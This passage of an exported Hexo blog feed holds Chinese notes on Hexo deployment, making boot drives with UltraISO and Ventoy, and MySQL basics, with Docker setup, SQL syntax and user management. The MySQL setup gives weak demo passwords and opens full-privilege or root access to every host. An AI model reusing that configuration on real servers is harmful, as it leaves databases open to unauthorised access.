title="5.本地运行预览"></a>5.本地运行预览</h3><pre><code class="hljs bash">hexo server</code></pre><hr><h3 id="6-清除文件"><a href="#6-清除文件" class="headerlink" title="6.清除文件"></a>6.清除文件</h3><pre><code class="hljs bash">hexo clean</code></pre><hr><h3 id="7-生成博客文件"><a href="#7-生成博客文件" class="headerlink" title="7.生成博客文件"></a>7.生成博客文件</h3><pre><code class="hljs bash">hexo generate</code></pre><hr><h3 id="8-安装-git-自动化部署"><a href="#8-安装-git-自动化部署" class="headerlink" title="8.安装 git 自动化部署"></a>8.安装 git 自动化部署</h3><pre><code class="hljs bash">npm install hexo deployer-git --save</code></pre><hr><h3 id="9-修改-config-yml-文件"><a href="#9-修改-config-yml-文件" class="headerlink" title="9.修改 _config.yml 文件"></a>9.修改 _config.yml 文件</h3><pre><code class="hljs bash">deploy:  <span class="hljs-built_in">type</span>: git  repo: https://github.com/xxx/xxx.github.io.git  branch: master</code></pre><hr><h3 id="10-推送到远端服务器"><a href="#10-推送到远端服务器" class="headerlink" title="10.推送到远端服务器"></a>10.推送到远端服务器</h3><pre><code class="hljs bash">hexo deploy</code></pre><hr><h3 id="11-下载-yilia-主题"><a href="#11-下载-yilia-主题" class="headerlink" title="11.下载 yilia 主题"></a>11.下载 yilia 主题</h3><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/litten/hexo-theme-yilia themes/yilia</code></pre><hr><h3 id="12-修改-config-yml-文件"><a href="#12-修改-config-yml-文件" class="headerlink" title="12.修改 _config.yml 文件"></a>12.修改 _config.yml 文件</h3><pre><code class="hljs bash">themes：yilia</code></pre><hr><p>Hexo 文档： <a href="https://hexo.io/">Hexo</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UltraISO</title>
      <link href="/2020/09/12/UltraISO/"/>
      <url>/2020/09/12/UltraISO/</url>
      
        <content type="html"><![CDATA[<h2 id="UltraISO制作U盘-光盘启动"><a href="#UltraISO制作U盘-光盘启动" class="headerlink" title="UltraISO制作U盘&#x2F;光盘启动"></a>UltraISO制作U盘&#x2F;光盘启动</h2><h3 id="一、-软件下载"><a href="#一、-软件下载" class="headerlink" title="一、 软件下载"></a>一、 软件下载</h3><pre><code class="hljs dts">可通过如下蓝奏地址下载单文件版，这个不能用的话，自行下载最新付费版<span class="hljs-symbol">https:</span><span class="hljs-comment">//wwox.lanzout.com/iHejo11pzi2d</span>复制代码</code></pre><p>有时需要修改一下管理员+兼容模式</p><p><img src="file:///E:/temp/%E9%9D%A2%E5%90%91%E5%AE%A2%E6%88%B7/img/sys_install/ultraiso%E5%90%AF%E5%8A%A8%E7%9B%98/1.%E8%BD%AF%E4%BB%B6%E9%85%8D%E7%BD%AE.png" alt="软件配置"></p><p>软件配置</p><h3 id="二、UltraISO制作光盘启动"><a href="#二、UltraISO制作光盘启动" class="headerlink" title="二、UltraISO制作光盘启动"></a>二、UltraISO制作光盘启动</h3><h4 id="Step1：打开ISO镜像"><a href="#Step1：打开ISO镜像" class="headerlink" title="Step1：打开ISO镜像"></a>Step1：打开ISO镜像</h4><blockquote><p>双击打开软件，在左下角本地目录找到相应的镜像，在右侧双击ISO镜像</p></blockquote><p><img src="file:///E:/temp/%E9%9D%A2%E5%90%91%E5%AE%A2%E6%88%B7/img/sys_install/ultraiso%E5%90%AF%E5%8A%A8%E7%9B%98/2.%E6%89%93%E5%BC%80%E9%95%9C%E5%83%8F.png" alt="打开镜像"></p><p>打开镜像</p><h4 id="Step2-1：刻录光盘镜像"><a href="#Step2-1：刻录光盘镜像" class="headerlink" title="Step2.1：刻录光盘镜像"></a>Step2.1：刻录光盘镜像</h4><blockquote><p>如果是光盘，则选择工具-刻录光盘映像</p></blockquote><p><img src="file:///E:/temp/%E9%9D%A2%E5%90%91%E5%AE%A2%E6%88%B7/img/sys_install/ultraiso%E5%90%AF%E5%8A%A8%E7%9B%98/3.%E5%88%BB%E5%BD%95%E5%85%89%E7%9B%98%E9%95%9C%E5%83%8F.png" alt="刻录光盘镜像"></p><p>刻录光盘镜像</p><h4 id="Step2-2：刻录硬盘镜像"><a href="#Step2-2：刻录硬盘镜像" class="headerlink" title="Step2.2：刻录硬盘镜像"></a>Step2.2：刻录硬盘镜像</h4><blockquote><p>如果是U盘，则选择启动-写入硬盘映像</p></blockquote><p><img src="file:///E:/temp/%E9%9D%A2%E5%90%91%E5%AE%A2%E6%88%B7/img/sys_install/ultraiso%E5%90%AF%E5%8A%A8%E7%9B%98/4.%E5%88%BB%E5%BD%95%E7%A1%AC%E7%9B%98%E9%95%9C%E5%83%8F.png" alt="刻录硬盘镜像"></p><p>刻录硬盘镜像</p><h4 id="Step3：刻录"><a href="#Step3：刻录" class="headerlink" title="Step3：刻录"></a>Step3：刻录</h4><blockquote><p>选择映像ISO后刻录，其他建议默认，等待约10-15分钟。</p></blockquote><p><img src="file:///E:/temp/%E9%9D%A2%E5%90%91%E5%AE%A2%E6%88%B7/img/sys_install/ultraiso%E5%90%AF%E5%8A%A8%E7%9B%98/5.%E5%88%BB%E5%BD%95.png" alt="刻录"></p><p>刻录</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><pre><code class="hljs">1.刻录光盘时要等光盘自己弹出来2.保证系统不睡眠休眠关闭屏幕，这些莫名的都会导致刻录失败。复制代码</code></pre><h1 id=""><a href="#" class="headerlink" title=""></a></h1><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ventoy</title>
      <link href="/2020/09/12/Ventoy/"/>
      <url>/2020/09/12/Ventoy/</url>
      
        <content type="html"><![CDATA[<h2 id="Ventoy制作U盘启动"><a href="#Ventoy制作U盘启动" class="headerlink" title="Ventoy制作U盘启动"></a>Ventoy制作U盘启动</h2><pre><code class="hljs">优点：  1.将U盘划分成两个分区，升级Ventoy不影响U盘里数据。  2.将ISO镜像直接拷贝到U盘中，不需要刻录U盘导致每次都要格式化U盘。  3.下载个WinPE的ISO镜像还能处理Windows的问题缺点：  1.并非所有镜像都支持，比如龙芯的部分镜像。总结：  运维人员可购买两个U盘，  一个8/64G及以上，装Ventoy，不仅可以安装系统，还可以当正常的U盘使用；  一个8G及以上，用UltraISO刻录U盘。注意：服务器基本都不支持U盘启动方式。刻录光盘或使用IBMC方式。复制代码</code></pre><h3 id="一、软件下载"><a href="#一、软件下载" class="headerlink" title="一、软件下载"></a>一、软件下载</h3><pre><code class="hljs awk">打开项目主页，根据提示下载最新版本https:<span class="hljs-regexp">//</span>www.ventoy.net<span class="hljs-regexp">/cn/</span>download.html复制代码</code></pre><p>ventoy下载</p><h3 id="二、-打开ventoy应用"><a href="#二、-打开ventoy应用" class="headerlink" title="二、 打开ventoy应用"></a>二、 打开ventoy应用</h3><blockquote><p>打开ventoy，根据所需修改配置选项的内容，一般默认即可</p></blockquote><p>打开ventoy</p><h3 id="三、-点击安装或升级"><a href="#三、-点击安装或升级" class="headerlink" title="三、 点击安装或升级"></a>三、 点击安装或升级</h3><blockquote><p>升级不影响原数据，安装后将iso镜像直接复制到U盘即可</p></blockquote><p>修改配置文件</p><p>复制ISO到U盘</p><blockquote><p>至此，ventoy方式的启动盘安装完毕</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/2020/03/19/MySQL/"/>
      <url>/2020/03/19/MySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><pre><code class="hljs bash"><span class="hljs-comment"># 数据库DB：存储数据的仓库，数据是有组织的进行存储；</span><span class="hljs-comment"># 数据库管理系统DBMS：操纵和管理数据库的大型软件；</span><span class="hljs-comment"># SQL：操作关系型数据库的编程语言，定义了一套操作；</span><span class="hljs-comment"># 常见数据库：Oracle、MySQL、SQL Server</span><span class="hljs-comment"># mysql，旧版本以5.7为主流，新版本是8</span>database &gt; table (column | row)</code></pre><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><pre><code class="hljs bash"><span class="hljs-comment"># mysql库是mysql的核心数据库</span><span class="hljs-comment"># infomation_schema 是 SQL注入常见的数据库，提供对数据库元数据的只读访问，包括数据库、表、列、索引、权限等信息</span></code></pre><h3 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h3><pre><code class="hljs bash"><span class="hljs-comment"># 常用表</span>schemata: 列出所有数据库tables: 列出所有表及其属性columns: 列出所有列及其属性statistics: 列出索引信息user_privileges 和 schema_privileges: 列出用户权限<span class="hljs-comment"># 查询所有数据库</span><span class="hljs-keyword">select</span> schema_name from information_schema.schemata;<span class="hljs-comment"># 查询所有表</span><span class="hljs-keyword">select</span> table_name from information_schema.tables;<span class="hljs-keyword">select</span> * from information_schema.tables <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;emp&#x27;</span>; <span class="hljs-comment"># 查找emp表的信息，所属用户等</span><span class="hljs-comment"># 查询所列</span><span class="hljs-keyword">select</span> column_name from information_schema.columns;<span class="hljs-keyword">select</span> column_name from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;emp&#x27;</span>; <span class="hljs-comment"># 查看emp表的字段</span><span class="hljs-comment"># </span>use information_schemashow tables;<span class="hljs-keyword">select</span> * from tables; <span class="hljs-comment"># 有table_name(表名), table_schema（库名）等</span><span class="hljs-keyword">select</span> * from columns; <span class="hljs-comment"># 有table_name(表名), table_schema（库名）, column_name(列名，字段)等</span></code></pre><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="SQL通用语法"><a href="#SQL通用语法" class="headerlink" title="SQL通用语法"></a>SQL通用语法</h3><pre><code class="hljs bash"><span class="hljs-comment"># SQL可以单行或者多行书写，以分号结尾</span><span class="hljs-comment"># SQL可以使用空格/缩进 来增强预计的可读性</span><span class="hljs-comment"># MySQL数据库的SQL语句不区分大小写，关键词建议使用大写</span><span class="hljs-comment"># 注释：单行注释: -- 注释内容 或者 # 注释内容； 多行注释：/* 注释内容 */</span></code></pre><h3 id="SQL-分类"><a href="#SQL-分类" class="headerlink" title="SQL 分类"></a>SQL 分类</h3><pre><code class="hljs bash"><span class="hljs-comment"># DDL: 数据库定义语言，用于定义数据库对象（数据库、表、字段）；</span><span class="hljs-comment"># DML: 数据操作语言，用来对数据库表中的数据进行增删改；</span><span class="hljs-comment"># DQL: 数据查询语言，用来查询数据表中表的记录；</span><span class="hljs-comment"># DCL: 数据控制语言，用来创建数据库用户、控制数据库的访问权限；</span></code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="数据类型-1"><a href="#数据类型-1" class="headerlink" title="数据类型"></a>数据类型</h3><table><thead><tr><th align="left">类型</th><th align="left">bytes</th><th align="left">有符号范围(signed)</th><th align="left">无符号(unsigned)范围</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">tinyint</td><td align="left">1</td><td align="left">(-128, 127)</td><td align="left">(0, 255)</td><td align="left">小整数值</td></tr><tr><td align="left">smallint</td><td align="left">2</td><td align="left">(-32768, 32767)</td><td align="left">(0, 65535)</td><td align="left">大整数值</td></tr><tr><td align="left">mediumint</td><td align="left">3</td><td align="left">(-8388608, 8388607)</td><td align="left">(0, 16777215)</td><td align="left">大整数值</td></tr><tr><td align="left">int&#x2F;integer</td><td align="left">4</td><td align="left">(-2147483648, 2147483647)</td><td align="left">(0, 4294967295)</td><td align="left">大整数值</td></tr><tr><td align="left">bigint</td><td align="left">8</td><td align="left">(-2^63, 2^63-1)</td><td align="left">(0, 2^64-1)</td><td align="left">极大整数值</td></tr><tr><td align="left">float</td><td align="left">4</td><td align="left">(-3.402823466 E+38, 3.402823466351 E+38)</td><td align="left">0 和 (1.175494351 E-38, 3.402823466 E+38)</td><td align="left">单精度浮点数值</td></tr><tr><td align="left">double</td><td align="left">8</td><td align="left">(-1.7976931348623157 E+308, 1.7976931348623157 E+308)</td><td align="left">0 和 (2.2250738585072014 E-308, 1.7976931348623157 E+308)</td><td align="left">双精度浮点数值</td></tr><tr><td align="left">decimal</td><td align="left"></td><td align="left">依赖于 M (精度) 和 D (标度) 的值</td><td align="left">依赖于 M (精度) 和 D (标度) 的值</td><td align="left">小数值(精确点数)</td></tr></tbody></table><h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><table><thead><tr><th align="left">类型</th><th align="left">大小 bytes</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">0-255</td><td align="left">定长字符串（需要指定长度）</td></tr><tr><td align="left">varchar</td><td align="left">0-65535</td><td align="left">变长字符串（需要指定长度）</td></tr><tr><td align="left">tinyblob</td><td align="left">0-255</td><td align="left">不超过255个字符的二进制数据</td></tr><tr><td align="left">tinytext</td><td align="left">0-255</td><td align="left">短文本字符串</td></tr><tr><td align="left">blob</td><td align="left">0-65535</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="left">text</td><td align="left">0-65535</td><td align="left">长文本数据</td></tr><tr><td align="left">mediumblob</td><td align="left">0-16777215</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="left">mediumtext</td><td align="left">0-16777215</td><td align="left">中等长度文本数据</td></tr><tr><td align="left">longblob</td><td align="left">0-4294967295</td><td align="left">二进制形式的极大文本数据</td></tr></tbody></table><h3 id="日期时间类型"><a href="#日期时间类型" class="headerlink" title="日期时间类型"></a>日期时间类型</h3><table><thead><tr><th align="left">类型</th><th align="left">bytes</th><th align="left">范围</th><th align="left">格式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">date</td><td align="left">3</td><td align="left">1000-01-01 至 9999-12-31</td><td align="left">YYYY-MM-DD</td><td align="left">日期值</td></tr><tr><td align="left">time</td><td align="left">3</td><td align="left">-838:59:59 至 838:59:59</td><td align="left">HH:MM:SS</td><td align="left">时间值或者持续时间</td></tr><tr><td align="left">year</td><td align="left">1</td><td align="left">1901 至 2155</td><td align="left">YYYY</td><td align="left">年份值</td></tr><tr><td align="left">datetime</td><td align="left">8</td><td align="left">1000-01-01 00:00:00 至 9999-12-31 23:59:59</td><td align="left">YYYY-MM-DD HH:MM:SS</td><td align="left">混合日期和时间值</td></tr><tr><td align="left">timestamp</td><td align="left">4</td><td align="left">1970-01-01 00:00:01 值 2038-01-19 03:14:07</td><td align="left">YYYY-MM-DD HH:MM:SS</td><td align="left">混合日期和时间值，时间戳</td></tr></tbody></table><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><table><thead><tr><th align="left">权限</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">ALL,ALL PRIVILEGES</td><td align="left">所有权限</td></tr><tr><td align="left">select</td><td align="left">查询数据</td></tr><tr><td align="left">insert</td><td align="left">插入数据</td></tr><tr><td align="left">update</td><td align="left">修改数据</td></tr><tr><td align="left">delete</td><td align="left">删除数据</td></tr><tr><td align="left">alter</td><td align="left">修改表</td></tr><tr><td align="left">drop</td><td align="left">删除数据库&#x2F;表&#x2F;视图</td></tr><tr><td align="left">create</td><td align="left">创建数据库&#x2F;表</td></tr></tbody></table><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&gt;</td><td align="left">大于</td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于等于</td></tr><tr><td align="left">&lt;</td><td align="left">小于</td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于等于</td></tr><tr><td align="left">&#x3D;</td><td align="left">等于</td></tr><tr><td align="left">&lt;&gt; 或者 !&#x3D;</td><td align="left">不等于</td></tr><tr><td align="left">between … and …</td><td align="left">在某个范围之内(含最小，最大值)</td></tr><tr><td align="left">in (…)</td><td align="left">在 in 之后的列表中的值，多旋一</td></tr><tr><td align="left">like 占位符</td><td align="left">模糊匹配 (_匹配单个字符，%匹配任意字符)</td></tr><tr><td align="left">is NULL</td><td align="left">是 NULL</td></tr></tbody></table><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th align="left">逻辑运算符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">AND 或 &amp;&amp;</td><td align="left">并且（多个条件都成立）</td></tr><tr><td align="left">OR 或 ||</td><td align="left">或者（多个条件任意一个成立）</td></tr><tr><td align="left">NOT 或 ！</td><td align="left">非，不是</td></tr></tbody></table><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><p>将一列数据作为一个整体，进行纵向计算。</p><table><thead><tr><th align="left">聚合函数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">count</td><td align="left">统计数量</td></tr><tr><td align="left">max</td><td align="left">最大值</td></tr><tr><td align="left">min</td><td align="left">最小值</td></tr><tr><td align="left">avg</td><td align="left">平均值</td></tr><tr><td align="left">sum</td><td align="left">求和</td></tr></tbody></table><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Docker-安装-MySQL5-7"><a href="#Docker-安装-MySQL5-7" class="headerlink" title="Docker 安装 MySQL5.7"></a>Docker 安装 MySQL5.7</h2><h3 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h3><pre><code class="hljs shell">docker run -d -p 3306:3306 --privileged=true \-v /home/hjx/docker/mysql/conf/my.cnf:/etc/my.cnf \-v /home/hjx/docker/mysql/data:/var/lib/mysql \-e MYSQL_ROOT_PASSWORD=hadoop \--name mysql mysql:5.7 \--character-set-server=utf8mb4 \--collation-server=utf8mb4_general_cilanguage-shell复制代码</code></pre><blockquote><p>创建用户</p></blockquote><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">先进入容器</span>docker exec -it mysql bash<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">执行MySQL命令, 输入root密码, 连接MySQL</span>mysql -uroot -p<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">输入密码后, 执行下面命令创建新用户 (用户名: <span class="hljs-built_in">test</span> , 密码: test123)</span>GRANT ALL PRIVILEGES ON *.* TO &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;test123&#x27; WITH GRANT OPTION;language-shell复制代码</code></pre><h3 id="Docker-安装-MySQL8"><a href="#Docker-安装-MySQL8" class="headerlink" title="Docker 安装 MySQL8"></a>Docker 安装 MySQL8</h3><ol><li>拉起镜像</li></ol><pre><code class="hljs shell">docker pull mysql:8.0.12language-shell复制代码</code></pre><ol><li>创建数据目录和配置文件</li></ol><pre><code class="hljs shell">mkdir -p /usr/mysql/conf /usr/mysql/datachmod -R 755 /usr/mysql/language-shell复制代码</code></pre><ol><li>创建配置文件</li></ol><blockquote><p>vim &#x2F;usr&#x2F;mysql&#x2F;conf&#x2F;my.cnf</p></blockquote><pre><code class="hljs bash">[client]<span class="hljs-comment">#socket = /usr/mysql/mysqld.sock</span>default-character-set = utf8mb4[mysqld]<span class="hljs-comment">#pid-file        = /var/run/mysqld/mysqld.pid</span><span class="hljs-comment">#socket          = /var/run/mysqld/mysqld.sock</span><span class="hljs-comment">#datadir         = /var/lib/mysql</span><span class="hljs-comment">#socket = /usr/mysql/mysqld.sock</span><span class="hljs-comment">#pid-file = /usr/mysql/mysqld.pid</span>datadir = /usr/mysql/datacharacter_set_server = utf8mb4collation_server = utf8mb4_binsecure-file-priv= NULL<span class="hljs-comment"># Disabling symbolic-links is recommended to prevent assorted security risks</span>symbolic-links=0<span class="hljs-comment"># Custom config should go here</span></code></pre><ol><li>创建容器</li></ol><pre><code class="hljs shell">docker run --restart=unless-stopped -d --name mysql8 \-v /usr/mysql/conf/my.cnf:/etc/mysql/my.cnf \-v /usr/mysql/data:/var/lib/mysql \-p 3306:3306 -e MYSQL_ROOT_PASSWORD=hadoop mysqllanguage-shell复制代码</code></pre><ol><li>修改mysql密码以及可访问主机</li></ol><pre><code class="hljs shell">use mysql<span class="hljs-meta prompt_"># </span><span class="language-bash">修改访问主机以及密码等，设置为所有主机可访问</span>ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27;;<span class="hljs-meta prompt_"># </span><span class="language-bash">刷新</span>flush privileges;language-shell复制代码</code></pre><h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><h3 id="phpStudy"><a href="#phpStudy" class="headerlink" title="phpStudy"></a>phpStudy</h3><pre><code class="hljs bash"><span class="hljs-comment"># 解压安装后，配置环境变量</span>在path中添加：D:\phpstudy_pro\Extensions\MySQL5.7.26\bin<span class="hljs-comment"># 连接, 默认密码 root</span>mysql -u root -p mysql -h 192.168.16.2 -P 3396 -p</code></pre><hr><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><ol><li>查看库</li></ol><pre><code class="hljs bash">show databases;</code></pre><ol><li>创建库</li></ol><pre><code class="hljs bash">create database db_name; <span class="hljs-comment"># create database mz charset utf8mb4;</span></code></pre><ol><li>删除库</li></ol><pre><code class="hljs bash">drop database db_name;</code></pre><ol><li>选择库</li></ol><pre><code class="hljs bash">use db_name;</code></pre><ol><li>查看表</li></ol><pre><code class="hljs bash">show tables;</code></pre><ol><li>查看创建库创建语句</li></ol><pre><code class="hljs bash">show create database db_name;</code></pre><ol><li>查看选中的数据库</li></ol><pre><code class="hljs bash"><span class="hljs-keyword">select</span> database();</code></pre><ol><li>修改数据库字符集</li></ol><pre><code class="hljs bash">alter database db_name default charset=utf8;</code></pre><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><ol><li>查看表结构</li></ol><pre><code class="hljs bash">desc table_name; <span class="hljs-comment"># 查看Type，Key等</span></code></pre><ol><li>查看创建表的语句</li></ol><pre><code class="hljs bash">show create table table_name; <span class="hljs-comment"># 例如 show create table user;</span></code></pre><ol><li>创建表</li></ol><pre><code class="hljs bash">create table table_name(字段1字段类型comment <span class="hljs-string">&#x27;字段1的注释&#x27;</span>,字段2字段类型comment <span class="hljs-string">&#x27;字段2的注释&#x27;</span>,...) comment <span class="hljs-string">&#x27;表注释&#x27;</span><span class="hljs-comment"># 示例</span>create table <span class="hljs-built_in">test</span>(<span class="hljs-built_in">id</span> int comment <span class="hljs-string">&#x27;编号&#x27;</span>,name varchar(50) comment <span class="hljs-string">&#x27;姓名&#x27;</span>,age int comment <span class="hljs-string">&#x27;年龄&#x27;</span>,gender varchar(1) comment <span class="hljs-string">&#x27;性别&#x27;</span>) comment <span class="hljs-string">&#x27;用户表&#x27;</span>;<span class="hljs-comment"># 实例2</span>create table emp(<span class="hljs-built_in">id</span> int comment <span class="hljs-string">&#x27;编号&#x27;</span>,workno varchar(10) comment <span class="hljs-string">&#x27;工号&#x27;</span>,name varchar(10) comment <span class="hljs-string">&#x27;姓名&#x27;</span>,gender char(1) comment <span class="hljs-string">&#x27;性别&#x27;</span>,age tinyint unsigned comment <span class="hljs-string">&#x27;年龄&#x27;</span>,idcard char(18) comment <span class="hljs-string">&#x27;身份证号&#x27;</span>,entrydate <span class="hljs-built_in">date</span> comment <span class="hljs-string">&#x27;入职时间&#x27;</span>) comment <span class="hljs-string">&#x27;员工表&#x27;</span>;</code></pre><ol><li>修改表</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 添加一个字段</span>alter table emp add nickname varchar(20) comment <span class="hljs-string">&#x27;昵称&#x27;</span>;<span class="hljs-comment"># 修改数据类型</span>alter table emp modify nickname varchar(30);<span class="hljs-comment"># 修改字段名字，将nickname字段修改为username</span>alter table emp change nickname username varchar(50) comment <span class="hljs-string">&#x27;用户名&#x27;</span>;<span class="hljs-comment"># 删除字段，删除username字段</span>alter table emp drop username;<span class="hljs-comment"># 修改表名，将emp修改为employee</span>alter table emp rename to employee;</code></pre><ol><li>删除表</li></ol><pre><code class="hljs bash">drop table employee;</code></pre><h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><pre><code class="hljs bash">create table employee(<span class="hljs-built_in">id</span> int comment <span class="hljs-string">&#x27;编号&#x27;</span>,workno varchar(10) comment <span class="hljs-string">&#x27;工号&#x27;</span>,name varchar(10) comment <span class="hljs-string">&#x27;姓名&#x27;</span>,gender char(1) comment <span class="hljs-string">&#x27;性别&#x27;</span>,age tinyint unsigned comment <span class="hljs-string">&#x27;年龄&#x27;</span>,idcard char(18) comment <span class="hljs-string">&#x27;身份证号&#x27;</span>,entrydate <span class="hljs-built_in">date</span> comment <span class="hljs-string">&#x27;入职时间&#x27;</span>) comment <span class="hljs-string">&#x27;员工表&#x27;</span>;</code></pre><ol><li>插入数据</li></ol><pre><code class="hljs bash">insert into employee (<span class="hljs-built_in">id</span>, workno, name, gender, age, idcard, entrydate) values (1,<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-string">&#x27;mz&#x27;</span>,<span class="hljs-string">&#x27;男&#x27;</span>,18,<span class="hljs-string">&#x27;000000000000110000&#x27;</span>,<span class="hljs-string">&#x27;2025-09-09&#x27;</span>);<span class="hljs-comment"># 不指定字段，需要按顺序</span>insert into employee values (2,<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-string">&#x27;mzz&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,19,<span class="hljs-string">&#x27;000000000000120000&#x27;</span>,<span class="hljs-string">&#x27;2025-09-10&#x27;</span>);<span class="hljs-comment"># 批量添加</span>insert into employee values (3,<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-string">&#x27;mzz3&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,19,<span class="hljs-string">&#x27;000000000000130000&#x27;</span>,<span class="hljs-string">&#x27;2025-09-13&#x27;</span>),(4,<span class="hljs-string">&#x27;004&#x27;</span>,<span class="hljs-string">&#x27;mzz4&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,19,<span class="hljs-string">&#x27;000000000000140000&#x27;</span>,<span class="hljs-string">&#x27;2025-09-14&#x27;</span>),(5,<span class="hljs-string">&#x27;005&#x27;</span>,<span class="hljs-string">&#x27;mzz5&#x27;</span>,<span class="hljs-string">&#x27;女&#x27;</span>,19,<span class="hljs-string">&#x27;000000000000150000&#x27;</span>,<span class="hljs-string">&#x27;2025-09-15&#x27;</span>);</code></pre><ol><li>修改数据</li></ol><pre><code class="hljs bash">update employee <span class="hljs-built_in">set</span> name=<span class="hljs-string">&#x27;mzz6&#x27;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=4;<span class="hljs-comment"># 修改多个字段</span>update employee <span class="hljs-built_in">set</span> <span class="hljs-built_in">id</span>=3,name=<span class="hljs-string">&#x27;mzz3&#x27;</span>,gender=<span class="hljs-string">&#x27;男&#x27;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=5;<span class="hljs-comment"># 多个条件</span>update employee <span class="hljs-built_in">set</span> name=<span class="hljs-string">&#x27;mzz6&#x27;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=5 and </code></pre><ol><li>删除数据</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 删除符合条件的数据</span>delete from employee <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=3;<span class="hljs-comment"># 清空表</span>delete from employee;</code></pre><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><ol><li>查看用户</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有用户</span><span class="hljs-keyword">select</span> * from mysql.user;<span class="hljs-keyword">select</span> user,host from mysql.user;<span class="hljs-comment"># 查看当前用户</span><span class="hljs-keyword">select</span> user();</code></pre><ol><li>创建用户</li></ol><pre><code class="hljs bash">create user <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified by <span class="hljs-string">&#x27;123456&#x27;</span>;</code></pre><ol><li>修改密码</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 修改用户密码为123</span>alter user <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> identified with mysql_native_password by <span class="hljs-string">&#x27;123&#x27;</span>;</code></pre><ol><li>删除用户</li></ol><pre><code class="hljs bash">drop user <span class="hljs-string">&#x27;mz&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span>;</code></pre><h3 id="权限-1"><a href="#权限-1" class="headerlink" title="权限"></a>权限</h3><table><thead><tr><th align="left">权限</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">ALL,ALL PRIVILEGES</td><td align="left">所有权限</td></tr><tr><td align="left">select</td><td align="left">查询数据</td></tr><tr><td align="left">insert</td><td align="left">插入数据</td></tr><tr><td align="left">update</td><td align="left">修改数据</td></tr><tr><td align="left">delete</td><td align="left">删除数据</td></tr><tr><td align="left">alter</td><td align="left">修改表</td></tr><tr><td align="left">drop</td><td align="left">删除数据库&#x2F;表&#x2F;视图</td></tr><tr><td align="left">create</td><td align="left">创建数据库&#x2F;表</td></tr></tbody></table><ol><li>查看权限</li></ol><pre><code class="hljs bash">show grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span 